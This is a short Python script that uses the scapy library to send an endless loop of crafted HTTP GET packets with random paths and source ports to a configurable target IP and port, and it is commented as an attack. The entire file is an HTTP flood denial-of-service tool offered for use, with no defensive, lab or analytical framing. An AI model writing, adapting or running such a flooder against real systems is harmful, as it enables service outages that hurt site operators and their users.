from scapy.all import *
import random

# Target configuration
target_ip = "176.16.1.10"  # Replace with your target
target_port = 80  # Standard HTTP port


# Function to generate a random URL path
def random_path():
    return f"/page{random.randint(1, 100)}.html"


# Function to send HTTP GET requests continuously
def http_flood():
    while True:
        # Create an HTTP GET request
        http_payload = f"GET {random_path()} HTTP/1.1\r\nHost: {target_ip}\r\nUser-Agent: Mozilla/5.0\r\nConnection: keep-alive\r\n\r\n"

        # Construct the TCP/IP packet
        ip_layer = IP(dst=target_ip)
        tcp_layer = TCP(sport=RandShort(), dport=target_port, flags="PA")
        raw_layer = Raw(load=http_payload)

        # Send the packet
        send(ip_layer / tcp_layer / raw_layer, verbose=0)
        print(f"Sent HTTP request to {target_ip}")


# Start attack
if __name__ == "__main__":
    http_flood()